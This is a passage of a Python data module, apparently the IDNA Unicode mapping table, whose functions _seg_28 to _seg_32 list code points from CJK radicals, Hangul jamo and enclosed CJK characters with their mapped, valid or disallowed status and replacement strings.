(0x2F5D, \'M\', \'\xe7\x8a\xac\'),\n    (0x2F5E, \'M\', \'\xe7\x8e\x84\'),\n    (0x2F5F, \'M\', \'\xe7\x8e\x89\'),\n    (0x2F60, \'M\', \'\xe7\x93\x9c\'),\n    (0x2F61, \'M\', \'\xe7\x93\xa6\'),\n    (0x2F62, \'M\', \'\xe7\x94\x98\'),\n    (0x2F63, \'M\', \'\xe7\x94\x9f\'),\n    (0x2F64, \'M\', \'\xe7\x94\xa8\'),\n    (0x2F65, \'M\', \'\xe7\x94\xb0\'),\n    (0x2F66, \'M\', \'\xe7\x96\x8b\'),\n    (0x2F67, \'M\', \'\xe7\x96\x92\'),\n    (0x2F68, \'M\', \'\xe7\x99\xb6\'),\n    (0x2F69, \'M\', \'\xe7\x99\xbd\'),\n    (0x2F6A, \'M\', \'\xe7\x9a\xae\'),\n    (0x2F6B, \'M\', \'\xe7\x9a\xbf\'),\n    (0x2F6C, \'M\', \'\xe7\x9b\xae\'),\n    (0x2F6D, \'M\', \'\xe7\x9f\x9b\'),\n    (0x2F6E, \'M\', \'\xe7\x9f\xa2\'),\n    (0x2F6F, \'M\', \'\xe7\x9f\xb3\'),\n    (0x2F70, \'M\', \'\xe7\xa4\xba\'),\n    (0x2F71, \'M\', \'\xe7\xa6\xb8\'),\n    (0x2F72, \'M\', \'\xe7\xa6\xbe\'),\n    (0x2F73, \'M\', \'\xe7\xa9\xb4\'),\n    (0x2F74, \'M\', \'\xe7\xab\x8b\'),\n    (0x2F75, \'M\', \'\xe7\xab\xb9\'),\n    (0x2F76, \'M\', \'\xe7\xb1\xb3\'),\n    (0x2F77, \'M\', \'\xe7\xb3\xb8\'),\n    (0x2F78, \'M\', \'\xe7\xbc\xb6\'),\n    (0x2F79, \'M\', \'\xe7\xbd\x91\'),\n    ]\n\ndef _seg_28() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x2F7A, \'M\', \'\xe7\xbe\x8a\'),\n    (0x2F7B, \'M\', \'\xe7\xbe\xbd\'),\n    (0x2F7C, \'M\', \'\xe8\x80\x81\'),\n    (0x2F7D, \'M\', \'\xe8\x80\x8c\'),\n    (0x2F7E, \'M\', \'\xe8\x80\x92\'),\n    (0x2F7F, \'M\', \'\xe8\x80\xb3\'),\n    (0x2F80, \'M\', \'\xe8\x81\xbf\'),\n    (0x2F81, \'M\', \'\xe8\x82\x89\'),\n    (0x2F82, \'M\', \'\xe8\x87\xa3\'),\n    (0x2F83, \'M\', \'\xe8\x87\xaa\'),\n    (0x2F84, \'M\', \'\xe8\x87\xb3\'),\n    (0x2F85, \'M\', \'\xe8\x87\xbc\'),\n    (0x2F86, \'M\', \'\xe8\x88\x8c\'),\n    (0x2F87, \'M\', \'\xe8\x88\x9b\'),\n    (0x2F88, \'M\', \'\xe8\x88\x9f\'),\n    (0x2F89, \'M\', \'\xe8\x89\xae\'),\n    (0x2F8A, \'M\', \'\xe8\x89\xb2\'),\n    (0x2F8B, \'M\', \'\xe8\x89\xb8\'),\n    (0x2F8C, \'M\', \'\xe8\x99\x8d\'),\n    (0x2F8D, \'M\', \'\xe8\x99\xab\'),\n    (0x2F8E, \'M\', \'\xe8\xa1\x80\'),\n    (0x2F8F, \'M\', \'\xe8\xa1\x8c\'),\n    (0x2F90, \'M\', \'\xe8\xa1\xa3\'),\n    (0x2F91, \'M\', \'\xe8\xa5\xbe\'),\n    (0x2F92, \'M\', \'\xe8\xa6\x8b\'),\n    (0x2F93, \'M\', \'\xe8\xa7\x92\'),\n    (0x2F94, \'M\', \'\xe8\xa8\x80\'),\n    (0x2F95, \'M\', \'\xe8\xb0\xb7\'),\n    (0x2F96, \'M\', \'\xe8\xb1\x86\'),\n    (0x2F97, \'M\', \'\xe8\xb1\x95\'),\n    (0x2F98, \'M\', \'\xe8\xb1\xb8\'),\n    (0x2F99, \'M\', \'\xe8\xb2\x9d\'),\n    (0x2F9A, \'M\', \'\xe8\xb5\xa4\'),\n    (0x2F9B, \'M\', \'\xe8\xb5\xb0\'),\n    (0x2F9C, \'M\', \'\xe8\xb6\xb3\'),\n    (0x2F9D, \'M\', \'\xe8\xba\xab\'),\n    (0x2F9E, \'M\', \'\xe8\xbb\x8a\'),\n    (0x2F9F, \'M\', \'\xe8\xbe\x9b\'),\n    (0x2FA0, \'M\', \'\xe8\xbe\xb0\'),\n    (0x2FA1, \'M\', \'\xe8\xbe\xb5\'),\n    (0x2FA2, \'M\', \'\xe9\x82\x91\'),\n    (0x2FA3, \'M\', \'\xe9\x85\x89\'),\n    (0x2FA4, \'M\', \'\xe9\x87\x86\'),\n    (0x2FA5, \'M\', \'\xe9\x87\x8c\'),\n    (0x2FA6, \'M\', \'\xe9\x87\x91\'),\n    (0x2FA7, \'M\', \'\xe9\x95\xb7\'),\n    (0x2FA8, \'M\', \'\xe9\x96\x80\'),\n    (0x2FA9, \'M\', \'\xe9\x98\x9c\'),\n    (0x2FAA, \'M\', \'\xe9\x9a\xb6\'),\n    (0x2FAB, \'M\', \'\xe9\x9a\xb9\'),\n    (0x2FAC, \'M\', \'\xe9\x9b\xa8\'),\n    (0x2FAD, \'M\', \'\xe9\x9d\x91\'),\n    (0x2FAE, \'M\', \'\xe9\x9d\x9e\'),\n    (0x2FAF, \'M\', \'\xe9\x9d\xa2\'),\n    (0x2FB0, \'M\', \'\xe9\x9d\xa9\'),\n    (0x2FB1, \'M\', \'\xe9\x9f\x8b\'),\n    (0x2FB2, \'M\', \'\xe9\x9f\xad\'),\n    (0x2FB3, \'M\', \'\xe9\x9f\xb3\'),\n    (0x2FB4, \'M\', \'\xe9\xa0\x81\'),\n    (0x2FB5, \'M\', \'\xe9\xa2\xa8\'),\n    (0x2FB6, \'M\', \'\xe9\xa3\x9b\'),\n    (0x2FB7, \'M\', \'\xe9\xa3\x9f\'),\n    (0x2FB8, \'M\', \'\xe9\xa6\x96\'),\n    (0x2FB9, \'M\', \'\xe9\xa6\x99\'),\n    (0x2FBA, \'M\', \'\xe9\xa6\xac\'),\n    (0x2FBB, \'M\', \'\xe9\xaa\xa8\'),\n    (0x2FBC, \'M\', \'\xe9\xab\x98\'),\n    (0x2FBD, \'M\', \'\xe9\xab\x9f\'),\n    (0x2FBE, \'M\', \'\xe9\xac\xa5\'),\n    (0x2FBF, \'M\', \'\xe9\xac\xaf\'),\n    (0x2FC0, \'M\', \'\xe9\xac\xb2\'),\n    (0x2FC1, \'M\', \'\xe9\xac\xbc\'),\n    (0x2FC2, \'M\', \'\xe9\xad\x9a\'),\n    (0x2FC3, \'M\', \'\xe9\xb3\xa5\'),\n    (0x2FC4, \'M\', \'\xe9\xb9\xb5\'),\n    (0x2FC5, \'M\', \'\xe9\xb9\xbf\'),\n    (0x2FC6, \'M\', \'\xe9\xba\xa5\'),\n    (0x2FC7, \'M\', \'\xe9\xba\xbb\'),\n    (0x2FC8, \'M\', \'\xe9\xbb\x83\'),\n    (0x2FC9, \'M\', \'\xe9\xbb\x8d\'),\n    (0x2FCA, \'M\', \'\xe9\xbb\x91\'),\n    (0x2FCB, \'M\', \'\xe9\xbb\xb9\'),\n    (0x2FCC, \'M\', \'\xe9\xbb\xbd\'),\n    (0x2FCD, \'M\', \'\xe9\xbc\x8e\'),\n    (0x2FCE, \'M\', \'\xe9\xbc\x93\'),\n    (0x2FCF, \'M\', \'\xe9\xbc\xa0\'),\n    (0x2FD0, \'M\', \'\xe9\xbc\xbb\'),\n    (0x2FD1, \'M\', \'\xe9\xbd\x8a\'),\n    (0x2FD2, \'M\', \'\xe9\xbd\x92\'),\n    (0x2FD3, \'M\', \'\xe9\xbe\x8d\'),\n    (0x2FD4, \'M\', \'\xe9\xbe\x9c\'),\n    (0x2FD5, \'M\', \'\xe9\xbe\xa0\'),\n    (0x2FD6, \'X\'),\n    (0x3000, \'3\', \' \'),\n    (0x3001, \'V\'),\n    (0x3002, \'M\', \'.\'),\n    (0x3003, \'V\'),\n    (0x3036, \'M\', \'\xe3\x80\x92\'),\n    (0x3037, \'V\'),\n    (0x3038, \'M\', \'\xe5\x8d\x81\'),\n    ]\n\ndef _seg_29() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x3039, \'M\', \'\xe5\x8d\x84\'),\n    (0x303A, \'M\', \'\xe5\x8d\x85\'),\n    (0x303B, \'V\'),\n    (0x3040, \'X\'),\n    (0x3041, \'V\'),\n    (0x3097, \'X\'),\n    (0x3099, \'V\'),\n    (0x309B, \'3\', \' \xe3\x82\x99\'),\n    (0x309C, \'3\', \' \xe3\x82\x9a\'),\n    (0x309D, \'V\'),\n    (0x309F, \'M\', \'\xe3\x82\x88\xe3\x82\x8a\'),\n    (0x30A0, \'V\'),\n    (0x30FF, \'M\', \'\xe3\x82\xb3\xe3\x83\x88\'),\n    (0x3100, \'X\'),\n    (0x3105, \'V\'),\n    (0x3130, \'X\'),\n    (0x3131, \'M\', \'\xe1\x84\x80\'),\n    (0x3132, \'M\', \'\xe1\x84\x81\'),\n    (0x3133, \'M\', \'\xe1\x86\xaa\'),\n    (0x3134, \'M\', \'\xe1\x84\x82\'),\n    (0x3135, \'M\', \'\xe1\x86\xac\'),\n    (0x3136, \'M\', \'\xe1\x86\xad\'),\n    (0x3137, \'M\', \'\xe1\x84\x83\'),\n    (0x3138, \'M\', \'\xe1\x84\x84\'),\n    (0x3139, \'M\', \'\xe1\x84\x85\'),\n    (0x313A, \'M\', \'\xe1\x86\xb0\'),\n    (0x313B, \'M\', \'\xe1\x86\xb1\'),\n    (0x313C, \'M\', \'\xe1\x86\xb2\'),\n    (0x313D, \'M\', \'\xe1\x86\xb3\'),\n    (0x313E, \'M\', \'\xe1\x86\xb4\'),\n    (0x313F, \'M\', \'\xe1\x86\xb5\'),\n    (0x3140, \'M\', \'\xe1\x84\x9a\'),\n    (0x3141, \'M\', \'\xe1\x84\x86\'),\n    (0x3142, \'M\', \'\xe1\x84\x87\'),\n    (0x3143, \'M\', \'\xe1\x84\x88\'),\n    (0x3144, \'M\', \'\xe1\x84\xa1\'),\n    (0x3145, \'M\', \'\xe1\x84\x89\'),\n    (0x3146, \'M\', \'\xe1\x84\x8a\'),\n    (0x3147, \'M\', \'\xe1\x84\x8b\'),\n    (0x3148, \'M\', \'\xe1\x84\x8c\'),\n    (0x3149, \'M\', \'\xe1\x84\x8d\'),\n    (0x314A, \'M\', \'\xe1\x84\x8e\'),\n    (0x314B, \'M\', \'\xe1\x84\x8f\'),\n    (0x314C, \'M\', \'\xe1\x84\x90\'),\n    (0x314D, \'M\', \'\xe1\x84\x91\'),\n    (0x314E, \'M\', \'\xe1\x84\x92\'),\n    (0x314F, \'M\', \'\xe1\x85\xa1\'),\n    (0x3150, \'M\', \'\xe1\x85\xa2\'),\n    (0x3151, \'M\', \'\xe1\x85\xa3\'),\n    (0x3152, \'M\', \'\xe1\x85\xa4\'),\n    (0x3153, \'M\', \'\xe1\x85\xa5\'),\n    (0x3154, \'M\', \'\xe1\x85\xa6\'),\n    (0x3155, \'M\', \'\xe1\x85\xa7\'),\n    (0x3156, \'M\', \'\xe1\x85\xa8\'),\n    (0x3157, \'M\', \'\xe1\x85\xa9\'),\n    (0x3158, \'M\', \'\xe1\x85\xaa\'),\n    (0x3159, \'M\', \'\xe1\x85\xab\'),\n    (0x315A, \'M\', \'\xe1\x85\xac\'),\n    (0x315B, \'M\', \'\xe1\x85\xad\'),\n    (0x315C, \'M\', \'\xe1\x85\xae\'),\n    (0x315D, \'M\', \'\xe1\x85\xaf\'),\n    (0x315E, \'M\', \'\xe1\x85\xb0\'),\n    (0x315F, \'M\', \'\xe1\x85\xb1\'),\n    (0x3160, \'M\', \'\xe1\x85\xb2\'),\n    (0x3161, \'M\', \'\xe1\x85\xb3\'),\n    (0x3162, \'M\', \'\xe1\x85\xb4\'),\n    (0x3163, \'M\', \'\xe1\x85\xb5\'),\n    (0x3164, \'X\'),\n    (0x3165, \'M\', \'\xe1\x84\x94\'),\n    (0x3166, \'M\', \'\xe1\x84\x95\'),\n    (0x3167, \'M\', \'\xe1\x87\x87\'),\n    (0x3168, \'M\', \'\xe1\x87\x88\'),\n    (0x3169, \'M\', \'\xe1\x87\x8c\'),\n    (0x316A, \'M\', \'\xe1\x87\x8e\'),\n    (0x316B, \'M\', \'\xe1\x87\x93\'),\n    (0x316C, \'M\', \'\xe1\x87\x97\'),\n    (0x316D, \'M\', \'\xe1\x87\x99\'),\n    (0x316E, \'M\', \'\xe1\x84\x9c\'),\n    (0x316F, \'M\', \'\xe1\x87\x9d\'),\n    (0x3170, \'M\', \'\xe1\x87\x9f\'),\n    (0x3171, \'M\', \'\xe1\x84\x9d\'),\n    (0x3172, \'M\', \'\xe1\x84\x9e\'),\n    (0x3173, \'M\', \'\xe1\x84\xa0\'),\n    (0x3174, \'M\', \'\xe1\x84\xa2\'),\n    (0x3175, \'M\', \'\xe1\x84\xa3\'),\n    (0x3176, \'M\', \'\xe1\x84\xa7\'),\n    (0x3177, \'M\', \'\xe1\x84\xa9\'),\n    (0x3178, \'M\', \'\xe1\x84\xab\'),\n    (0x3179, \'M\', \'\xe1\x84\xac\'),\n    (0x317A, \'M\', \'\xe1\x84\xad\'),\n    (0x317B, \'M\', \'\xe1\x84\xae\'),\n    (0x317C, \'M\', \'\xe1\x84\xaf\'),\n    (0x317D, \'M\', \'\xe1\x84\xb2\'),\n    (0x317E, \'M\', \'\xe1\x84\xb6\'),\n    (0x317F, \'M\', \'\xe1\x85\x80\'),\n    (0x3180, \'M\', \'\xe1\x85\x87\'),\n    (0x3181, \'M\', \'\xe1\x85\x8c\'),\n    (0x3182, \'M\', \'\xe1\x87\xb1\'),\n    (0x3183, \'M\', \'\xe1\x87\xb2\'),\n    (0x3184, \'M\', \'\xe1\x85\x97\'),\n    ]\n\ndef _seg_30() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x3185, \'M\', \'\xe1\x85\x98\'),\n    (0x3186, \'M\', \'\xe1\x85\x99\'),\n    (0x3187, \'M\', \'\xe1\x86\x84\'),\n    (0x3188, \'M\', \'\xe1\x86\x85\'),\n    (0x3189, \'M\', \'\xe1\x86\x88\'),\n    (0x318A, \'M\', \'\xe1\x86\x91\'),\n    (0x318B, \'M\', \'\xe1\x86\x92\'),\n    (0x318C, \'M\', \'\xe1\x86\x94\'),\n    (0x318D, \'M\', \'\xe1\x86\x9e\'),\n    (0x318E, \'M\', \'\xe1\x86\xa1\'),\n    (0x318F, \'X\'),\n    (0x3190, \'V\'),\n    (0x3192, \'M\', \'\xe4\xb8\x80\'),\n    (0x3193, \'M\', \'\xe4\xba\x8c\'),\n    (0x3194, \'M\', \'\xe4\xb8\x89\'),\n    (0x3195, \'M\', \'\xe5\x9b\x9b\'),\n    (0x3196, \'M\', \'\xe4\xb8\x8a\'),\n    (0x3197, \'M\', \'\xe4\xb8\xad\'),\n    (0x3198, \'M\', \'\xe4\xb8\x8b\'),\n    (0x3199, \'M\', \'\xe7\x94\xb2\'),\n    (0x319A, \'M\', \'\xe4\xb9\x99\'),\n    (0x319B, \'M\', \'\xe4\xb8\x99\'),\n    (0x319C, \'M\', \'\xe4\xb8\x81\'),\n    (0x319D, \'M\', \'\xe5\xa4\xa9\'),\n    (0x319E, \'M\', \'\xe5\x9c\xb0\'),\n    (0x319F, \'M\', \'\xe4\xba\xba\'),\n    (0x31A0, \'V\'),\n    (0x31E4, \'X\'),\n    (0x31F0, \'V\'),\n    (0x3200, \'3\', \'(\xe1\x84\x80)\'),\n    (0x3201, \'3\', \'(\xe1\x84\x82)\'),\n    (0x3202, \'3\', \'(\xe1\x84\x83)\'),\n    (0x3203, \'3\', \'(\xe1\x84\x85)\'),\n    (0x3204, \'3\', \'(\xe1\x84\x86)\'),\n    (0x3205, \'3\', \'(\xe1\x84\x87)\'),\n    (0x3206, \'3\', \'(\xe1\x84\x89)\'),\n    (0x3207, \'3\', \'(\xe1\x84\x8b)\'),\n    (0x3208, \'3\', \'(\xe1\x84\x8c)\'),\n    (0x3209, \'3\', \'(\xe1\x84\x8e)\'),\n    (0x320A, \'3\', \'(\xe1\x84\x8f)\'),\n    (0x320B, \'3\', \'(\xe1\x84\x90)\'),\n    (0x320C, \'3\', \'(\xe1\x84\x91)\'),\n    (0x320D, \'3\', \'(\xe1\x84\x92)\'),\n    (0x320E, \'3\', \'(\xea\xb0\x80)\'),\n    (0x320F, \'3\', \'(\xeb\x82\x98)\'),\n    (0x3210, \'3\', \'(\xeb\x8b\xa4)\'),\n    (0x3211, \'3\', \'(\xeb\x9d\xbc)\'),\n    (0x3212, \'3\', \'(\xeb\xa7\x88)\'),\n    (0x3213, \'3\', \'(\xeb\xb0\x94)\'),\n    (0x3214, \'3\', \'(\xec\x82\xac)\'),\n    (0x3215, \'3\', \'(\xec\x95\x84)\'),\n    (0x3216, \'3\', \'(\xec\x9e\x90)\'),\n    (0x3217, \'3\', \'(\xec\xb0\xa8)\'),\n    (0x3218, \'3\', \'(\xec\xb9\xb4)\'),\n    (0x3219, \'3\', \'(\xed\x83\x80)\'),\n    (0x321A, \'3\', \'(\xed\x8c\x8c)\'),\n    (0x321B, \'3\', \'(\xed\x95\x98)\'),\n    (0x321C, \'3\', \'(\xec\xa3\xbc)\'),\n    (0x321D, \'3\', \'(\xec\x98\xa4\xec\xa0\x84)\'),\n    (0x321E, \'3\', \'(\xec\x98\xa4\xed\x9b\x84)\'),\n    (0x321F, \'X\'),\n    (0x3220, \'3\', \'(\xe4\xb8\x80)\'),\n    (0x3221, \'3\', \'(\xe4\xba\x8c)\'),\n    (0x3222, \'3\', \'(\xe4\xb8\x89)\'),\n    (0x3223, \'3\', \'(\xe5\x9b\x9b)\'),\n    (0x3224, \'3\', \'(\xe4\xba\x94)\'),\n    (0x3225, \'3\', \'(\xe5\x85\xad)\'),\n    (0x3226, \'3\', \'(\xe4\xb8\x83)\'),\n    (0x3227, \'3\', \'(\xe5\x85\xab)\'),\n    (0x3228, \'3\', \'(\xe4\xb9\x9d)\'),\n    (0x3229, \'3\', \'(\xe5\x8d\x81)\'),\n    (0x322A, \'3\', \'(\xe6\x9c\x88)\'),\n    (0x322B, \'3\', \'(\xe7\x81\xab)\'),\n    (0x322C, \'3\', \'(\xe6\xb0\xb4)\'),\n    (0x322D, \'3\', \'(\xe6\x9c\xa8)\'),\n    (0x322E, \'3\', \'(\xe9\x87\x91)\'),\n    (0x322F, \'3\', \'(\xe5\x9c\x9f)\'),\n    (0x3230, \'3\', \'(\xe6\x97\xa5)\'),\n    (0x3231, \'3\', \'(\xe6\xa0\xaa)\'),\n    (0x3232, \'3\', \'(\xe6\x9c\x89)\'),\n    (0x3233, \'3\', \'(\xe7\xa4\xbe)\'),\n    (0x3234, \'3\', \'(\xe5\x90\x8d)\'),\n    (0x3235, \'3\', \'(\xe7\x89\xb9)\'),\n    (0x3236, \'3\', \'(\xe8\xb2\xa1)\'),\n    (0x3237, \'3\', \'(\xe7\xa5\x9d)\'),\n    (0x3238, \'3\', \'(\xe5\x8a\xb4)\'),\n    (0x3239, \'3\', \'(\xe4\xbb\xa3)\'),\n    (0x323A, \'3\', \'(\xe5\x91\xbc)\'),\n    (0x323B, \'3\', \'(\xe5\xad\xa6)\'),\n    (0x323C, \'3\', \'(\xe7\x9b\xa3)\'),\n    (0x323D, \'3\', \'(\xe4\xbc\x81)\'),\n    (0x323E, \'3\', \'(\xe8\xb3\x87)\'),\n    (0x323F, \'3\', \'(\xe5\x8d\x94)\'),\n    (0x3240, \'3\', \'(\xe7\xa5\xad)\'),\n    (0x3241, \'3\', \'(\xe4\xbc\x91)\'),\n    (0x3242, \'3\', \'(\xe8\x87\xaa)\'),\n    (0x3243, \'3\', \'(\xe8\x87\xb3)\'),\n    (0x3244, \'M\', \'\xe5\x95\x8f\'),\n    (0x3245, \'M\', \'\xe5\xb9\xbc\'),\n    (0x3246, \'M\', \'\xe6\x96\x87\'),\n    ]\n\ndef _seg_31() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x3247, \'M\', \'\xe7\xae\x8f\'),\n    (0x3248, \'V\'),\n    (0x3250, \'M\', \'pte\'),\n    (0x3251, \'M\', \'21\'),\n    (0x3252, \'M\', \'22\'),\n    (0x3253, \'M\', \'23\'),\n    (0x3254, \'M\', \'24\'),\n    (0x3255, \'M\', \'25\'),\n    (0x3256, \'M\', \'26\'),\n    (0x3257, \'M\', \'27\'),\n    (0x3258, \'M\', \'28\'),\n    (0x3259, \'M\', \'29\'),\n    (0x325A, \'M\', \'30\'),\n    (0x325B, \'M\', \'31\'),\n    (0x325C, \'M\', \'32\'),\n    (0x325D, \'M\', \'33\'),\n    (0x325E, \'M\', \'34\'),\n    (0x325F, \'M\', \'35\'),\n    (0x3260, \'M\', \'\xe1\x84\x80\'),\n    (0x3261, \'M\', \'\xe1\x84\x82\'),\n    (0x3262, \'M\', \'\xe1\x84\x83\'),\n    (0x3263, \'M\', \'\xe1\x84\x85\'),\n    (0x3264, \'M\', \'\xe1\x84\x86\'),\n    (0x3265, \'M\', \'\xe1\x84\x87\'),\n    (0x3266, \'M\', \'\xe1\x84\x89\'),\n    (0x3267, \'M\', \'\xe1\x84\x8b\'),\n    (0x3268, \'M\', \'\xe1\x84\x8c\'),\n    (0x3269, \'M\', \'\xe1\x84\x8e\'),\n    (0x326A, \'M\', \'\xe1\x84\x8f\'),\n    (0x326B, \'M\', \'\xe1\x84\x90\'),\n    (0x326C, \'M\', \'\xe1\x84\x91\'),\n    (0x326D, \'M\', \'\xe1\x84\x92\'),\n    (0x326E, \'M\', \'\xea\xb0\x80\'),\n    (0x326F, \'M\', \'\xeb\x82\x98\'),\n    (0x3270, \'M\', \'\xeb\x8b\xa4\'),\n    (0x3271, \'M\', \'\xeb\x9d\xbc\'),\n    (0x3272, \'M\', \'\xeb\xa7\x88\'),\n    (0x3273, \'M\', \'\xeb\xb0\x94\'),\n    (0x3274, \'M\', \'\xec\x82\xac\'),\n    (0x3275, \'M\', \'\xec\x95\x84\'),\n    (0x3276, \'M\', \'\xec\x9e\x90\'),\n    (0x3277, \'M\', \'\xec\xb0\xa8\'),\n    (0x3278, \'M\', \'\xec\xb9\xb4\'),\n    (0x3279, \'M\', \'\xed\x83\x80\'),\n    (0x327A, \'M\', \'\xed\x8c\x8c\'),\n    (0x327B, \'M\', \'\xed\x95\x98\'),\n    (0x327C, \'M\', \'\xec\xb0\xb8\xea\xb3\xa0\'),\n    (0x327D, \'M\', \'\xec\xa3\xbc\xec\x9d\x98\'),\n    (0x327E, \'M\', \'\xec\x9a\xb0\'),\n    (0x327F, \'V\'),\n    (0x3280, \'M\', \'\xe4\xb8\x80\'),\n    (0x3281, \'M\', \'\xe4\xba\x8c\'),\n    (0x3282, \'M\', \'\xe4\xb8\x89\'),\n    (0x3283, \'M\', \'\xe5\x9b\x9b\'),\n    (0x3284, \'M\', \'\xe4\xba\x94\'),\n    (0x3285, \'M\', \'\xe5\x85\xad\'),\n    (0x3286, \'M\', \'\xe4\xb8\x83\'),\n    (0x3287, \'M\', \'\xe5\x85\xab\'),\n    (0x3288, \'M\', \'\xe4\xb9\x9d\'),\n    (0x3289, \'M\', \'\xe5\x8d\x81\'),\n    (0x328A, \'M\', \'\xe6\x9c\x88\'),\n    (0x328B, \'M\', \'\xe7\x81\xab\'),\n    (0x328C, \'M\', \'\xe6\xb0\xb4\'),\n    (0x328D, \'M\', \'\xe6\x9c\xa8\'),\n    (0x328E, \'M\', \'\xe9\x87\x91\'),\n    (0x328F, \'M\', \'\xe5\x9c\x9f\'),\n    (0x3290, \'M\', \'\xe6\x97\xa5\'),\n    (0x3291, \'M\', \'\xe6\xa0\xaa\'),\n    (0x3292, \'M\', \'\xe6\x9c\x89\'),\n    (0x3293, \'M\', \'\xe7\xa4\xbe\'),\n    (0x3294, \'M\', \'\xe5\x90\x8d\'),\n    (0x3295, \'M\', \'\xe7\x89\xb9\'),\n    (0x3296, \'M\', \'\xe8\xb2\xa1\'),\n    (0x3297, \'M\', \'\xe7\xa5\x9d\'),\n    (0x3298, \'M\', \'\xe5\x8a\xb4\'),\n    (0x3299, \'M\', \'\xe7\xa7\x98\'),\n    (0x329A, \'M\', \'\xe7\x94\xb7\'),\n    (0x329B, \'M\', \'\xe5\xa5\xb3\'),\n    (0x329C, \'M\', \'\xe9\x81\xa9\'),\n    (0x329D, \'M\', \'\xe5\x84\xaa\'),\n    (0x329E, \'M\', \'\xe5\x8d\xb0\'),\n    (0x329F, \'M\', \'\xe6\xb3\xa8\'),\n    (0x32A0, \'M\', \'\xe9\xa0\x85\'),\n    (0x32A1, \'M\', \'\xe4\xbc\x91\'),\n    (0x32A2, \'M\', \'\xe5\x86\x99\'),\n    (0x32A3, \'M\', \'\xe6\xad\xa3\'),\n    (0x32A4, \'M\', \'\xe4\xb8\x8a\'),\n    (0x32A5, \'M\', \'\xe4\xb8\xad\'),\n    (0x32A6, \'M\', \'\xe4\xb8\x8b\'),\n    (0x32A7, \'M\', \'\xe5\xb7\xa6\'),\n    (0x32A8, \'M\', \'\xe5\x8f\xb3\'),\n    (0x32A9, \'M\', \'\xe5\x8c\xbb\'),\n    (0x32AA, \'M\', \'\xe5\xae\x97\'),\n    (0x32AB, \'M\', \'\xe5\xad\xa6\'),\n    (0x32AC, \'M\', \'\xe7\x9b\xa3\'),\n    (0x32AD, \'M\', \'\xe4\xbc\x81\'),\n    (0x32AE, \'M\', \'\xe8\xb3\x87\'),\n    (0x32AF, \'M\', \'\xe5\x8d\x94\'),\n    (0x32B0, \'M\', \'\xe5\xa4\x9c\'),\n    (0x32B1, \'M\', \'36\'),\n    ]\n\ndef _seg_32() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x32B2, \'M\', \'37\'),\n    (0x32B3, \'M\', \'38\'),\n    (0x32B4, \'M\', \'39\'),\n    (0x32B5, \'M\', \'40\'),\n    (0x32B6, \'M\', \'41\'),\n    (0x32B7, \'M\', \'42\'),\n    (0x32B8, \'M\', \'43\'),\n    (0x32B9, \'M\', \'44\'),\n    (0x32BA, \'M\', \'45\'),\n    (0x32BB, \'M\', \'46\'),\n    (0x32BC, \'M\', \'47\'),\n    (0x32BD, \'M\', \'48\'),\n    (0x32BE, \'M\', \'49\'),\n    (0x32BF, \'M\', \'50\'),\n    (0x32C0, \'M\', \'1\xe6\x9c\x88\'),\n    (0x32C1, \'M\', \'2\xe6\x9c\x88\'),\n    (0x32C2, \'M\', \'3\xe6\x9c\x88\'),\n    (0x32C3, \'M\', \'4\xe6\x9c\x88\'),\n    (0x32C4, \'M\', \'5\xe6\x9c\x88\'),\n    (0x32C5, \'M\', \'6\xe6\x9c\x88\'),\n    (0x32C6, \'M\', \'7\xe6\x9c\x88\'),\n    (0x32C7, \'M\', \'8\xe6\x9c\x88\'),\n    (0x32C8, \'M\', \'9\xe6\x9c\x88\'),\n    (0x32C9, \'M\', \'10\xe6\x9c\x88\'),\n    (0x32CA, \'M\', \'11\xe6\x9c\x88\'),\n    (0x32CB, \'M\', \'12\xe6\x9c\x88\'),\n    (0x32CC, \'M\', \'hg\'),\n    (0x32CD, \'M\', \'erg\'),\n    (0x32CE, \'M\', \'ev\'),\n    (0x32CF, \'M\', \'ltd\'),\n    (0x32D0, \'M\', \'\xe3\x82\xa2\'),\n    (0x32D1, \'M\', \'\xe3\x82\xa4\'),\n    (0x32D2, \'M\', \'\xe3\x82\xa6\'),\n    (0x32D3, \'M\', \'\xe3\x82\xa8\'),\n    (0x32D4, \'M\', \'\xe3\x82\xaa\'),\n    (0x32D5, \'M\', \'\xe3\x82\xab\'),\n    (0x32D6, \'M\', \'\xe3\x82\xad\'),\n    (0x32D7, \'M\', \'\xe3\x82\xaf\'),\n    (0x32D8, \'M\', \'\xe3\x82\xb1\'),\n    (0x32D9, \'M\', \'\xe3\x82\xb3\'),\n    (0x32DA, \'M\', \'\xe3\x82\xb5\'),\n    (0x32DB, \'M\', \'\xe3\x82\xb7\'),\n    (0x32DC, \'M\', \'\xe3\x82\xb9\'),\n    (0x32DD, \'M\', \'\xe3\x82\xbb\'),\n    (0x32DE, \'M\', \'\xe3\x82\xbd\'),\n    (0x32DF, \'M\', \'\xe3\x82\xbf\'),\n    (0x32E0, \'M\', \'\xe3\x83\x81\'),\n    (0x32E1, \'M\', \'\xe3\x83\x84\'),\n    (0x32E2, \'M\', \'\xe3\x83\x86\'),\n    (0x32E3, \'M\', \'\xe3\x83\x88\'),\n    (0x32E4, \'M\', \'\xe3\x83\x8a\'),\n    (0x32E5, \'M\', \'\xe3\x83\x8b\'),\n    (0x32E6, \'M\', \'\xe3\x83\x8c\'),\n    (0x32E7, \'M\', \'\xe3\x83\x8d\'),\n    (0x32E8, \'M\', \'\xe3\x83\x8e\'),\n    (0x32E9, \'M\', \'\xe3\x83\x8f\'),\n    (0x32EA, \'M\', \'\xe3\x83\x92\'),\n    (0x32EB, \'M\', \'\xe3\x83\x95\'),\n    (0x32EC, \'M\', \'\xe3\x83\x98\'),\n    (0x32ED, \'M\', \'\xe3\x83\x9b\'),\n    (0x32EE, \'M\', \'\xe3\x83\x9e\'),\n    (0x32EF, \'M\', \'\xe3\x83\x9f\'),\n    (0x32F0, \'M\', \'\xe3\x83\xa0\'),\n    (0x32F1, \'M\', \'\xe3\x83\xa1\'),\n    (0x32F2, \'M\', \'\xe3\x83\xa2\'),\n    (0x32F3, \'M\', \'\xe3\x83\xa4\'),\n    (0x32F4, \'M\', \'\xe3\x83\xa6\'),\n    (0x32F5, \'M\', \'\xe3\x83\xa8\'),\n    (0x32F6, \'M\', \'\xe3\x83\xa9\'),\n    (0x32F7, \'M\', \'\xe3\x83\xaa\'),\n    